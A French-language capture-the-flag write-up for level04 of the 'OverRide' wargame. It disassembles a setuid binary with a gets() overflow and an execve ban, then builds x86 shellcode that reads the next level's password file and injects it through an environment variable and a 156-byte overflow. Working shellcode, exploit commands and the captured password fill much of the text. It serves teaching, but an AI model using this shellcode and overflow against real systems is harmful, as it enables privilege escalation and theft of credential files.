# 04 - Shellcoding 1

- On se connecte en tant que level00:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```

```
level04@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x080486c8 <+0>:     push   %ebp
   0x080486c9 <+1>:     mov    %esp,%ebp
   0x080486cb <+3>:     push   %edi
   0x080486cc <+4>:     push   %ebx
   0x080486cd <+5>:     and    $0xfffffff0,%esp
   0x080486d0 <+8>:     sub    $0xb0,%esp
   0x080486d6 <+14>:    call   0x8048550 <fork@plt>
   0x080486db <+19>:    mov    %eax,0xac(%esp)
   0x080486e2 <+26>:    lea    0x20(%esp),%ebx
   0x080486e6 <+30>:    mov    $0x0,%eax
   0x080486eb <+35>:    mov    $0x20,%edx
   0x080486f0 <+40>:    mov    %ebx,%edi
   0x080486f2 <+42>:    mov    %edx,%ecx
   0x080486f4 <+44>:    rep stos %eax,%es:(%edi)
   0x080486f6 <+46>:    movl   $0x0,0xa8(%esp)
   0x08048701 <+57>:    movl   $0x0,0x1c(%esp)
   0x08048709 <+65>:    cmpl   $0x0,0xac(%esp)
   0x08048711 <+73>:    jne    0x8048769 <main+161>
   0x08048713 <+75>:    movl   $0x1,0x4(%esp)
   0x0804871b <+83>:    movl   $0x1,(%esp)
   0x08048722 <+90>:    call   0x8048540 <prctl@plt>
   0x08048727 <+95>:    movl   $0x0,0xc(%esp)
   0x0804872f <+103>:   movl   $0x0,0x8(%esp)
   0x08048737 <+111>:   movl   $0x0,0x4(%esp)
   0x0804873f <+119>:   movl   $0x0,(%esp)
   0x08048746 <+126>:   call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:   movl   $0x8048903,(%esp)
   0x08048752 <+138>:   call   0x8048500 <puts@plt>
   0x08048757 <+143>:   lea    0x20(%esp),%eax
   0x0804875b <+147>:   mov    %eax,(%esp)
   0x0804875e <+150>:   call   0x80484b0 <gets@plt>
   0x08048763 <+155>:   jmp    0x804881a <main+338>
   0x08048768 <+160>:   nop
   0x08048769 <+161>:   lea    0x1c(%esp),%eax
   0x0804876d <+165>:   mov    %eax,(%esp)
   0x08048770 <+168>:   call   0x80484f0 <wait@plt>
   0x08048775 <+173>:   mov    0x1c(%esp),%eax
   0x08048779 <+177>:   mov    %eax,0xa0(%esp)
   0x08048780 <+184>:   mov    0xa0(%esp),%eax
   0x08048787 <+191>:   and    $0x7f,%eax
   0x0804878a <+194>:   test   %eax,%eax
   0x0804878c <+196>:   je     0x80487ac <main+228>
   0x0804878e <+198>:   mov    0x1c(%esp),%eax
   0x08048792 <+202>:   mov    %eax,0xa4(%esp)
   0x08048799 <+209>:   mov    0xa4(%esp),%eax
   0x080487a0 <+216>:   and    $0x7f,%eax
   0x080487a3 <+219>:   add    $0x1,%eax
   0x080487a6 <+222>:   sar    %al
   0x080487a8 <+224>:   test   %al,%al
   0x080487aa <+226>:   jle    0x80487ba <main+242>
   0x080487ac <+228>:   movl   $0x804891d,(%esp)
   0x080487b3 <+235>:   call   0x8048500 <puts@plt>
   0x080487b8 <+240>:   jmp    0x804881a <main+338>
   0x080487ba <+242>:   movl   $0x0,0xc(%esp)
   0x080487c2 <+250>:   movl   $0x2c,0x8(%esp)
   0x080487ca <+258>:   mov    0xac(%esp),%eax
   0x080487d1 <+265>:   mov    %eax,0x4(%esp)
   0x080487d5 <+269>:   movl   $0x3,(%esp)
   0x080487dc <+276>:   call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:   mov    %eax,0xa8(%esp)
   0x080487e8 <+288>:   cmpl   $0xb,0xa8(%esp)
   0x080487f0 <+296>:   jne    0x8048768 <main+160>
   0x080487f6 <+302>:   movl   $0x8048931,(%esp)
   0x080487fd <+309>:   call   0x8048500 <puts@plt>
   0x08048802 <+314>:   movl   $0x9,0x4(%esp)
   0x0804880a <+322>:   mov    0xac(%esp),%eax
   0x08048811 <+329>:   mov    %eax,(%esp)
   0x08048814 <+332>:   call   0x8048520 <kill@plt>
   0x08048819 <+337>:   nop
   0x0804881a <+338>:   mov    $0x0,%eax
   0x0804881f <+343>:   lea    -0x8(%ebp),%esp
   0x08048822 <+346>:   pop    %ebx
   0x08048823 <+347>:   pop    %edi
   0x08048824 <+348>:   pop    %ebp
   0x08048825 <+349>:   ret
End of assembler dump.
```

- Voyons les parties les plus importantes du programme:
```
   0x080486d6 <+14>:    call   0x8048550 <fork@plt>
   0x080486db <+19>:    mov    %eax,0x8048550
```
> On fork, le pid est stocké en `0x8048550`

```
   0x08048727 <+95>:    movl   $0x0,0xc(%esp)
   0x0804872f <+103>:   movl   $0x0,0x8(%esp)
   0x08048737 <+111>:   movl   $0x0,0x4(%esp)
   0x0804873f <+119>:   movl   $0x0,(%esp)
   0x08048746 <+126>:   call   0x8048570 <ptrace@plt>
```
> Le processus parrent trace le processus enfant

```
   0x08048757 <+143>:   lea    0x20(%esp),%eax
   0x0804875b <+147>:   mov    %eax,(%esp)
   0x0804875e <+150>:   call   0x80484b0 <gets@plt>
```
> `<gets@plt>` prompt stdin, l'input est stocké en `0x20(%esp)`.

- Donc le processus enfant nous laisse écrire sur sa stack sans limite, voyons ce que fait le processus parent:
```
   0x08048769 <+161>:   lea    0x1c(%esp),%eax
   0x0804876d <+165>:   mov    %eax,(%esp)
   0x08048770 <+168>:   call   0x80484f0 <wait@plt>
```
> Attend que le processus enfant change d'état.
```
   0x08048775 <+173>:   mov    0x1c(%esp),%eax
   0x08048779 <+177>:   mov    %eax,0xa0(%esp)
   0x08048780 <+184>:   mov    0xa0(%esp),%eax
   0x08048787 <+191>:   and    $0x7f,%eax
   0x0804878a <+194>:   test   %eax,%eax
   0x0804878c <+196>:   je     0x80487ac <main+228>
```
```
   0x0804878e <+198>:   mov    0x1c(%esp),%eax
   0x08048792 <+202>:   mov    %eax,0xa4(%esp)
   0x08048799 <+209>:   mov    0xa4(%esp),%eax
   0x080487a0 <+216>:   and    $0x7f,%eax
   0x080487a3 <+219>:   add    $0x1,%eax
   0x080487a6 <+222>:   sar    %al
   0x080487a8 <+224>:   test   %al,%al
   0x080487aa <+226>:   jle    0x80487ba <main+242>
```
```
   0x080487ac <+228>:   movl   $0x804891d,(%esp)
   0x080487b3 <+235>:   call   0x8048500 <puts@plt>
   0x080487b8 <+240>:   jmp    0x804881a <main+338>
```
```
   0x080487ba <+242>:   movl   $0x0,0xc(%esp)
   0x080487c2 <+250>:   movl   $0x2c,0x8(%esp)
   0x080487ca <+258>:   mov    0xac(%esp),%eax
   0x080487d1 <+265>:   mov    %eax,0x4(%esp)
   0x080487d5 <+269>:   movl   $0x3,(%esp)
   0x080487dc <+276>:   call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:   mov    %eax,0xa8(%esp)
   0x080487e8 <+288>:   cmpl   $0xb,0xa8(%esp)
   0x080487f0 <+296>:   jne    0x8048768 <main+160>
```
> `0x804891d: "child is exiting..."`

> Si le processus enfant s'est terminé, `puts("child is exiting...")` et retourne. Sinon, si le processus enfant n'a pas utilisé `execve()` (syscall 0xb), on repart pour un tour de boucle.

```
   0x080487f6 <+302>:   movl   $0x8048931,(%esp)
   0x080487fd <+309>:   call   0x8048500 <puts@plt>
   0x08048802 <+314>:   movl   $0x9,0x4(%esp)
   0x0804880a <+322>:   mov    0xac(%esp),%eax
   0x08048811 <+329>:   mov    %eax,(%esp)
   0x08048814 <+332>:   call   0x8048520 <kill@plt>
```
> `0x8048500: "no exec() for you"`

> Si le processus enfant utilise `execve()`, `puts("no exec() for you")` et `kill(0x9, pid)`, donc notre shellcode ne doit pas call `execve()`.

- Construisons notre shellcode, attention aux [bad characters](https://www.google.com/search?q=shellcode+bad+characters):
```asm
start:
        and    $0xfffffff0,%esp
        sub    $0x40,%esp

        xor    %eax,%eax
        add    $0x73,%eax
        mov    %eax,0x18(%esp)
        movl   $0x7361702e,0x14(%esp)
        movl   $0x2f35306c,0x10(%esp)
        movl   $0x6576656c,0xc(%esp)
        movl   $0x2f737265,0x8(%esp)
        movl   $0x73752f65,0x4(%esp)
        movl   $0x6d6f682f,(%esp)

        mov    %esp,%ebx
        xor    %ecx,%ecx
        xor    %edx,%edx
        xor    %eax,%eax
        add    $0x5,%eax
        int    $0x80

        mov    %eax,%ebx
        mov    %esp,%ecx
        xor    %edx,%edx
        add    $0x28,%edx
        xor    %eax,%eax
        add    $0x3,%eax
        int    $0x80

        xor    %ebx,%ebx
        add    $0x1,%ebx
        mov    %esp,%ecx
        xor    %edx,%edx
        add    $0x28,%edx
        xor    %eax,%eax
        add    $0x4,%eax
        int    $0x80

        xor    %ebx,%ebx
        xor    %eax,%eax
        add    $0x1,%eax
        int    $0x80
```
- Ça devrait ouvrir et lire '/home/users/level05/.pass' puis afficher son contenu.

```
level04@OverRide:~$ as -32 /tmp/shellcode.asm -o /tmp/shellcode.o
```
```
level04@OverRide:~$ ld -m elf_i386 -o /tmp/shellcode /tmp/shellcode.o
```
```
level04@OverRide:~$ objdump -d /tmp/shellcode
/tmp/shellcode: file format elf32-i386
Disassembly of section .text:
08048054 <start>:
 8048054:       83 e4 f0                and    $0xfffffff0,%esp
 8048057:       83 ec 40                sub    $0x40,%esp
 804805a:       31 c0                   xor    %eax,%eax
 804805c:       83 c0 73                add    $0x73,%eax
 804805f:       89 44 24 18             mov    %eax,0x18(%esp)
 8048063:       c7 44 24 14 2e 70 61    movl   $0x7361702e,0x14(%esp)
 804806a:       73
 804806b:       c7 44 24 10 6c 30 35    movl   $0x2f35306c,0x10(%esp)
 8048072:       2f
 8048073:       c7 44 24 0c 6c 65 76    movl   $0x6576656c,0xc(%esp)
 804807a:       65
 804807b:       c7 44 24 08 65 72 73    movl   $0x2f737265,0x8(%esp)
 8048082:       2f
 8048083:       c7 44 24 04 65 2f 75    movl   $0x73752f65,0x4(%esp)
 804808a:       73
 804808b:       c7 04 24 2f 68 6f 6d    movl   $0x6d6f682f,(%esp)
 8048092:       89 e3                   mov    %esp,%ebx
 8048094:       31 c9                   xor    %ecx,%ecx
 8048096:       31 d2                   xor    %edx,%edx
 8048098:       31 c0                   xor    %eax,%eax
 804809a:       83 c0 05                add    $0x5,%eax
 804809d:       cd 80                   int    $0x80
 804809f:       89 c3                   mov    %eax,%ebx
 80480a1:       89 e1                   mov    %esp,%ecx
 80480a3:       31 d2                   xor    %edx,%edx
 80480a5:       83 c2 28                add    $0x28,%edx
 80480a8:       31 c0                   xor    %eax,%eax
 80480aa:       83 c0 03                add    $0x3,%eax
 80480ad:       cd 80                   int    $0x80
 80480af:       31 db                   xor    %ebx,%ebx
 80480b1:       83 c3 01                add    $0x1,%ebx
 80480b4:       89 e1                   mov    %esp,%ecx
 80480b6:       31 d2                   xor    %edx,%edx
 80480b8:       83 c2 28                add    $0x28,%edx
 80480bb:       31 c0                   xor    %eax,%eax
 80480bd:       83 c0 04                add    $0x4,%eax
 80480c0:       cd 80                   int    $0x80
```

```
\x83\xe4\xf0\x83\xec\x40\x31\xc0\x83\xc0\x73\x89\x44\x24\x18\xc7\x44\x24\x14\x2e\x70\x61\x73\xc7\x44\x24\x10\x6c\x30\x35\x2f\xc7\x44\x24\x0c\x6c\x65\x76\x65\xc7\x44\x24\x08\x65\x72\x73\x2f\xc7\x44\x24\x04\x65\x2f\x75\x73\xc7\x04\x24\x2f\x68\x6f\x6d\x89\xe3\x31\xc9\x31\xd2\x31\xc0\x83\xc0\x05\xcd\x80\x89\xc3\x89\xe1\x31\xd2\x83\xc2\x28\x31\xc0\x83\xc0\x03\xcd\x80\x31\xdb\x83\xc3\x01\x89\xe1\x31\xd2\x83\xc2\x28\x31\xc0\x83\xc0\x04\xcd\x80
```

- Toujours mieux avec quelques `nop` en plus (\x90):
```
level04@OverRide:~$ export SHELLCODE=$(echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x83\xe4\xf0\x83\xec\x40\
x31\xc0\x83\xc0\x73\x89\x44\x24\x18\xc7\x44\x24\x14\x2e\x70\x61\x73\xc7\x44\x24\x10\x6c\x30\x35\x2f\xc7\x44\x24\x0c\x
6c\x65\x76\x65\xc7\x44\x24\x08\x65\x72\x73\x2f\xc7\x44\x24\x04\x65\x2f\x75\x73\xc7\x04\x24\x2f\x68\x6f\x6d\x89\xe3\x3
1\xc9\x31\xd2\x31\xc0\x83\xc0\x05\xcd\x80\x89\xc3\x89\xe1\x31\xd2\x83\xc2\x28\x31\xc0\x83\xc0\x03\xcd\x80\x31\xdb\x83
\xc3\x01\x89\xe1\x31\xd2\x83\xc2\x28\x31\xc0\x83\xc0\x04\xcd\x80")
```


- Notre buffer commence à `0x20(%esp)` et `esp` a été `sub` de 0xb0 bytes, et il y a un petit gap entre `0xb0(%esp)` et `ebp` à cause de `0x080486cd <+5>: and $0xfffffff0,%esp` et d'autres `push` qui ont été fait avant le `sub`.

- Nous trouvons un offset de 156 bytes avant que notre input commence à écraser le retour de la fonction `(ebp+0x4)`. Du coup:
```c
#include <stdio.h>
#include <stdlib.h>

void main(void)
{
        printf("%p\n", getenv("SHELLCODE"));
}
```
```
level04@OverRide:~$ /tmp/getenv
0xffffd869
level04@OverRide:~$ (python -c "print('a'*156 + '\xff\xff\xd8\x69'[::-1])") | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
